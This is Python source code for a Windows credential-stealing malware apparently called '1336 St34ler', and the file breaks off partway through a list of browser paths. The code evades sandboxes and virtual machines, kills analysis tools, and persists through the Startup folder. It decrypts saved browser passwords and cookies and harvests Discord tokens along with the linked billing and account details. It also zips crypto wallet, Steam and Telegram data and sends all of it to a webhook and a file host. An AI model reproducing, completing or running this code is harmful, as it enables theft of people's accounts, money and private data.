import os # W4SP SKID 
import threading
from sys import executable
import subprocess
import time
import signal

def handler(signum, frame):
    exit(0)

signal.signal(signal.SIGINT, handler)

requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"],
    ["subprocess", "subprocess"],
    ["re", "re"],
    ["random", "random"],
    ["random", "random"],
    ["zipfile", "zipfile"],
    ["threading", "threading"],
    ["json", "json"],
    ["ctypes", "ctypes"],
    ["base64", "base64"],
    ["ctypes", "ctypes"],
    ["sqlite3", "pysqlite3"],
    ["winreg", "winreg"],
    ["ntpath", "ntpath"],
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)


from sqlite3 import connect as sql_connect
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import loads, dumps
import time
import shutil
from zipfile import ZipFile
import random
import shutil, random
import ntpath
import json
import winreg
import re

bluseurs = [
    "WDAGUtilityAccount", "Robert", "Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq",
    "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl",
]
blpcname = [
    "DESKTOP-CDLNVOQ", "BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM",
    "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4",
    "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH",
]
blhwid = [
    "7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009",
    "11111111-2222-3333-4444-555555555555", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548",
    "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972", "79AF5279-16CF-4094-9758-F88A616D81B4",
    "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022",
    "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65", "B1112042-52E8-E25B-3655-6A4F54155DBF",
    "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C",
    "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670",
    "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A",
    "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27",
]

hwid = uuidwndz = subprocess.check_output("wmic csproduct get uuid", creationflags=0x08000000).decode().split('\n')[1].strip()

if os.getenv("COMPUTERNAME") in blpcname:
    exit()
if os.getlogin() in bluseurs:
    exit()
if hwid in blhwid:
    exit()

def regkey():
    reg1 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
    reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")
    if (reg1 and reg2) != 1:
        exit()
    handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')
    try:
        reg_val = winreg.QueryValueEx(handle, '0')[0]
        if ("VMware" or "VBOX") in reg_val:
            exit()
    finally:
        winreg.CloseKey(handle)

class StartUp:
    procces_list = ["WindowsDefenderChecker", "WindowsBinaryX86", 'PCHealthify', 'ProcessUUID', 'YourPhone', 'Registry', 'fontdrvhost', 'gameinputsvc', 'CefSharp.BrowserSubprocess']
    path = str(os.getenv('appdata')+f'\Microsoft\Windows\Start Menu\Programs\Startup')
    current_name = None

    def setinstartup():
        for file in os.listdir(StartUp.path):
            if file.replace('.exe', '') in StartUp.procces_list:
                os.remove(StartUp.path+"\\"+file)
        StartUp.current_name = random.choice(StartUp.procces_list)
        shutil.copy(__file__, f'{StartUp.path}\{StartUp.current_name}')
        

    def isinstartup():
        for file in os.listdir(StartUp.path):
            if str(file) == str(StartUp.current_name):
                return True
        return False

try:
    StartUp.setinstartup()
except:
    pass


try:        
    from psutil import process_iter, NoSuchProcess, AccessDenied, ZombieProcess
    class antitrack:
        def fuck(names):
            for proc in process_iter():
                try:
                    for name in names:
                        if name.lower() in proc.name().lower():
                            proc.kill()
                except (NoSuchProcess, AccessDenied, ZombieProcess):
                    pass
        def amongus():
            pl = ['http', 'traffic', 'wireshark', 'fiddler', 'packet', "httpdebuggerui", "vboxservice", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver", 'cmd', 'regedit', 'debug']
            return antitrack.fuck(names=pl)   
    antitrack.amongus()
except:
    pass

DETECTED = False

def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip


import requests
from Crypto.Cipher import AES

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)

def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
def LoadRequests(methode, url, data='', files='', headers=''):
    for i in range(8): # max trys
        try:
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code == 200 or r.status_code == 413: # 413 = DATA TO BIG
                        return r
        except:
            pass

def LoadUrlib(hook, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(hook, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(hook, data=data))
                return r
        except: 
            pass

def globalInfo():
    ip = getip()
    username = os.getenv("USERNAME")
    ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
    # print(ipdatanojson)
    ipdata = loads(ipdatanojson)
    # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
    contry = ipdata["country_name"]
    contryCode = ipdata["country_code"].lower()
    globalinfo = f"> **__Username:__** {username.upper()} 〃 **__IP:__** {ip} ({contry} :flag_{contryCode}:)"
    # print(globalinfo)
    return globalinfo


def Trust(Cookies):
    # simple Trust Factor system
    global DETECTED, data
    data = str(Cookies)
    tim = re.findall(".google.com", data)
    # print(len(tim))
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED
        
def GetUHQFriends(token):
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False

    uhqlist = ''
    for friend in friendlist:
        OwnedBadges = ''
        flags = friend['user']['public_flags']
        for badge in badgeList:
            if flags // badge["Value"] != 0 and friend['type'] == 1:
                if not "House" in badge["Name"]:
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if OwnedBadges != '':
            uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
    return uhqlist


def GetBilling(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False
    
    if billingjson == []: return "❌"

    billing = ""
    for methode in billingjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                billing += "<:1336:1035943500983840848>"
            elif methode["type"] == 2:
                billing += "<:1336:1035943454452219984> "

    return billing


def GetBadge(flags):
    if flags == 0: return ''

    OwnedBadges = ''
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:1336:1035943579522170880> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:1336:1035943518792859688> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:1336:1035943334348333177> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:1336:1035943433233256548> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:1336:1035943411074744453> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:1336:1035943421656961064> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:1336:1035943530977300511> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:1336:1035943400496705587> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:1336:1035943444146831400> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:1336:1035943488262516777> "}
    ]
    for badge in badgeList:
        if flags // badge["Value"] != 0:
            OwnedBadges += badge["Emoji"]
            flags = flags % badge["Value"]

    return OwnedBadges

def GetTokenInfo(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    username = userjson["username"]
    hashtag = userjson["discriminator"]
    email = userjson["email"]
    idd = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    mfa = userjson['mfa_enabled']
    nitro = ""
    phone = ""

    if "premium_type" in userjson: 
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<:1336:1035943369463038024> "
        elif nitrot == 2:
            nitro = "<:1336:1035943383505588264> "
    if "phone" in userjson: 
        phone = f'`{userjson["phone"]}`'
    else:
        phone = '❌'

    if mfa == True:
        mfa = "✅"
    else:
        mfa = "❌"

    return username, hashtag, email, idd, pfp, flags, nitro, phone, mfa

def checkToken(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False

def getUHQguilds(token):
    try:
        hq_guilds = []
        guilds = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
        if guilds:
            for guild in guilds:
                admin = True if str(guild['permissions']) == str('4398046511103') else False
                if admin and int(guild['approximate_member_count']) >= 100:
                    owner = "✅" if guild['owner'] else "❌"

                    invites = requests.get(f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token}).json()
                    if len(invites) > 0:
                        invite = f"https://discord.gg/{invites[0]['code']}"
                    else:
                        invite = "[No Invite](https://t.me/st34ler)"

                    hq_guilds.append(f"**{guild['name']} ({guild['id']})** \n Owner: `{owner}` 〃 Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n{invite}")

            if len(hq_guilds) > 0:
                hq_guilds = '\n'.join(hq_guilds)
            else:
                hq_guilds = "❌"
        else:
            hq_guilds = "❌"
        return hq_guilds
    except:
        pass

def getGiftCodes(token):
    gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).json()
    if gift_codes:
        codes = []
        for code in gift_codes:
            name = code['promotion']['outbound_title']
            code = code['code']
            codes.append(f":gift: `{name}`\n:ticket: `{code}`")
        if len(codes) > 0:
            codes = '\n\n'.join(codes)
        else:
            codes = "❌"
    else:
        codes = "❌"
    return codes

def uploadToken(token, path):
    global hook
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    username, hashtag, email, idd, pfp, flags, nitro, phone, mfa = GetTokenInfo(token)

    if pfp == None: 
        pfp = "https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

    billing = GetBilling(token)
    badge = GetBadge(flags)
    friends = GetUHQFriends(token)
    guilds = getUHQguilds(token)
    giftcodes = getGiftCodes(token)
    if friends == '': friends = "No Rare Friends"
    if billing == "":
        billing = "❌"
    if phone == "":
        phone = "❌"
        
    data = {
        "content": f'{globalInfo()} 〃 [@1336ST34ler](https://t.me/st34ler)',
        "embeds": [
            {
            "color": 0,
            "fields": [
                {
                    "name": "<:1336:1032617971325087814> Email:",
                    "value": f"`{email}`",
                    "inline": True
                },
                {
                    "name": "<:1336:1032618023112151041> Phone:",
                    "value": f"{phone}",
                    "inline": True
                },
                {
                    "name": ":globe_with_meridians: IP:",
                    "value": f"`{getip()}`",
                    "inline": True
                },
                {
                    "name": "<:1336:1032618004757872680> Badges:",
                    "value": f"{nitro}{badge}",
                    "inline": True
                },
                {
                    "name": ":lock: 2FA:",
                    "value": f"{mfa}",
                    "inline": True
                },
                {
                    "name": ":credit_card: Billing:",
                    "value": f"{billing}",
                    "inline": True
                },
                                {
                    "name": "<:1336:1032618013536559184> Token:",
                    "value": f"`{token}`\n[Click to copy](https://superfurrycdn.nl/copy/{token})"
                },
                {
                    "name": "<a:1336:1032617983291432960> HQ Friends:",
                    "value": f"{friends}",
                    "inline": False
                },
                {
                    "name": "<:1336:1036007667711365220> HQ Guilds:",
                    "value": f"{guilds}",
                    "inline": False
                },
                {
                    "name": "<a:1336:1036008036684267581> Gift Codes:",
                    "value": f"{giftcodes}",
                    "inline": False
                }
                ],
            "author": {
                "name": f"{username}#{hashtag} ({idd})",
                "icon_url": f"{pfp}"
                },
            "footer": {
                "text": "@1336St34ler",
                "icon_url": "https://media.discordapp.net/attachments/1018947277349462168/1032691694711353445/1336.png"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
            }
        ],
        "avatar_url": "https://media.discordapp.net/attachments/1018947277349462168/1032691694711353445/1336.png",
        "username": "1336St34ler",
        "attachments": []
        }
    # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)

def Reformat(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def upload(name, link):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if name == "cookies":
        rb = ' | '.join(da for da in cookiWords)
        if len(rb) > 1000: 
            rrrrr = Reformat(str(cookiWords))
            rb = ' | '.join(da for da in rrrrr)
        data = {
            "content": f'{globalInfo()} 〃 [@1336ST34ler](https://t.me/st34ler)',
            "embeds": [
                {
                    "title": "Cookies Stealer",
                    "description": f"**Important Cookies Found**:\n{rb}\n\n**Data:**\n:cookie: 〃 **{CookiCount}** Cookies Found\n:link: 〃 [Cookies.txt]({link})",
                    "color": 0,
                    "footer": {
                        "text": "@1336St34ler",
                        "icon_url": "https://media.discordapp.net/attachments/1018947277349462168/1032691694711353445/1336.png"
                    }
                }
            ],
            "username": "1336 St34ler",
            "avatar_url": "https://media.discordapp.net/attachments/1018947277349462168/1032691694711353445/1336.png",
            "attachments": []
            }
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
    return

    if name == "password":
        ra = ' | '.join(da for da in paswWords)
        if len(ra) > 1000: 
            rrr = Reformat(str(paswWords))
            ra = ' | '.join(da for da in rrr)

        data = {
            "content": f'{globalInfo()} 〃 [@1336ST34ler](https://t.me/st34ler)',
            "embeds": [
                {
                    "title": "Password Stealer",
                    "description": f"**Important Passwords Found**:\n{ra}\n\n**Data:**\n🔑 〃 **{PasswCount}** Passwords Found\n:link: 〃 [Password.txt]({link})",
                    "color": 0,
                    "footer": {
                        "text": "@1336St34ler",
                        "icon_url": "https://media.discordapp.net/attachments/1018947277349462168/1032691694711353445/1336.png"
                    }
                }
            ],
            "username": "1336",
            "avatar_url": "https://media.discordapp.net/attachments/1018947277349462168/1032691694711353445/1336.png",
            "attachments": []
            }
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
    return

    if name == "kiwi":
        data = {
            "content": f'{globalInfo()} 〃 [@1336ST34ler](https://t.me/st34ler)',
            "embeds": [
                {
                "color": 0,
                "fields": [
                    {
                    "name": "Important files found:",
                    "value": link
                    }
                ],
                "author": {
                    "name": "File Stealer"
                },
                "footer": {
                    "text": "@1336 STEALER",
                    "icon_url": "https://media.discordapp.net/attachments/1018947277349462168/1032691694711353445/1336.png"
                }
                }
            ],
            "username": "1336",
            "avatar_url": "https://media.discordapp.net/attachments/1018947277349462168/1032691694711353445/1336.png",
            "attachments": []
            }
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
    return



# def upload(name, tk=''):
#     headers = {
#         "Content-Type": "application/json",
#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
#     }

#
#     LoadRequests("POST", hook, files=files)

def writeforfile(data, name):
    path = os.getenv("TEMP") + f"\{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"〃  1336 STEALER ON TOP\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

Tokens = ''
def getToken(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for token in re.findall(regex, line):
                        global Tokens
                        if checkToken(token):
                            if not token in Tokens:
                                # print(token)
                                Tokens += token
                                uploadToken(token, path)

Passw = []
def getPassw(path, arg):
    global data
    global Passw, PasswCount
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in paswWords: paswWords.append(old)
            Passw.append(f"URL: {row[0]} | USERNAME: {row[1]} | PASSWORD: {DecryptValue(row[2], master_key)}")
            PasswCount += 1
    writeforfile(Passw, 'password')

Cookies = []    
def getCookie(path, arg):
    global data
    try:

        global Cookies, CookiCount
        if not os.path.exists(path): return
        
        pathC = path + arg + "/Cookies"
        if os.stat(pathC).st_size == 0: return
        
        tempfold = temp + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
        
        shutil.copy2(pathC, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies")
        data = cursor.fetchall()
        cursor.close()
        conn.close()
        os.remove(tempfold)

        pathKey = path + "/Local State"
        
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for row in data: 
            if row[0] != '':
                for wa in keyword:
                    old = wa
                    if "https" in wa:
                        tmp = wa
                        wa = tmp.split('[')[1].split(']')[0]
                    if wa in row[0]:
                        if not old in cookiWords: cookiWords.append(old)
                Cookies.append(f"{row[0]}\t{'FALSE' if row[4] == 0 else 'TRUE'}\t{row[3]}\t{'FALSE' if str(row[0]).startswith('.') else 'TRUE'}\t{row[4]}\t{row[1]}\t{DecryptValue(row[2], master_key)}")
                CookiCount += 1
        writeforfile(Cookies, 'cookies')
    except:
        pass

def GetDiscord(path, arg):
    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    # print(path, master_key)
    
    for file in os.listdir(pathC):
        # print(path, file)
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global Tokens
                    tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                    if checkToken(tokenDecoded):
                        if not tokenDecoded in Tokens:
                            # print(token)
                            Tokens += tokenDecoded
                            # writeforfile(Tokens, 'tokens')
                            uploadToken(tokenDecoded, path)

def GatherZips(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)
    
    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht: 
        thread.join()
    global WalletsZip, GamingZip, OtherZip

    wal, ga, ot = "",'',''
    if not len(WalletsZip) == 0:
        wal = "<:1336:1035948181994872872> Wallets\n"
        for i in WalletsZip:
            wal += f"〃 [{i[0]}]({i[1]})\n"
    if not len(WalletsZip) == 0:
        ga = ":video_game: Gaming:\n"
        for i in GamingZip:
            ga += f"〃 [{i[0]}]({i[1]})\n"
    if not len(OtherZip) == 0:
        ot = ":mobile_phone: Others\n"
        for i in OtherZip:
            ot += f"〃 [{i[0]}]({i[1]})\n"          
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    data = {
        "content": f'{globalInfo()} 〃 [@1336ST34ler](https://t.me/st34ler)',
        "embeds": [
            {
            "title": "Thanks for using 1336",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": 0,
            "footer": {
                "text": "@1336St34ler",
                "icon_url": "https://media.discordapp.net/attachments/1018947277349462168/1032691694711353445/1336.png"
            }
            }
        ],
        "username": "1336 St34ler",
        "avatar_url": "https://media.discordapp.net/attachments/1018947277349462168/1032691694711353445/1336.png",
        "attachments": []
    }
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)


def ZipTelegram(path, arg, procc):
    global OtherZip
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file and not "tdummy" in file and not "user_data" in file and not "webview" in file: 
            zf.write(pathC + "/" + file)
    zf.close()


    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    os.remove(f"{pathC}/{name}.zip")
    OtherZip.append([arg, lnik])

def ZipThings(path, arg, procc):
    if 'nkbihfbeogaeaoehlefnkodbefgpgknn' in path or 'nkbihfbeogaeaoehlefnkodbefgpgknn' in arg or 'nkbihfbeogaeaoehlefnkodbefgpgknn' in procc:
        return
    global ssfns
    pathC = path
    name = arg
    global WalletsZip, GamingZip, OtherZip
    # subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
    # os.system(f"taskkill /im {procc} /t /f")

    if "extension" in arg:
        name = procc
    
    if not os.path.exists(pathC): return
    try:
        subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
    except:
        pass

    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        ssfns = []
        if not os.path.isfile(f"{pathC}config/loginusers.vdf"): return

        f = open(f"{pathC}config/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg
        for file in os.listdir(pathC):
            if file.startswith('ssfn'):
                ssfns.append(file)

    try:
        zf = ZipFile(f"{pathC}/{name}.zip", "w")
        if "steam" in pathC.lower():
            for ssfn in ssfns:
                if not ".zip" in ssfn: zf.write(pathC + "/" + ssfn)
            for file in os.listdir(pathC+"config/"):
                if not ".zip" in file: zf.write(pathC + "config/" + file)
        else:
            for file in os.listdir(pathC):
                if not ".zip" in file: zf.write(pathC + "/" + file)
        zf.close()
    except Exception as e:
        print(e)


    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    os.remove(f"{pathC}/{name}.zip")

    if "Wallet" in arg:
        if arg == "Authenticator":
            OtherZip.append([name, lnik])
        else:
            WalletsZip.append([name, lnik])
    elif "extension" in procc:
        if arg == "Authenticator":
            OtherZip.append([name, lnik])
        else:
            WalletsZip.append([name, lnik])
    elif "NationsGlory" in name or "Steam" in name or "RiotClient" in name or "Minecraft" in name:
        GamingZip.append([name, lnik])
    else:
        OtherZip.append([name, lnik])


def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    browserPaths = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
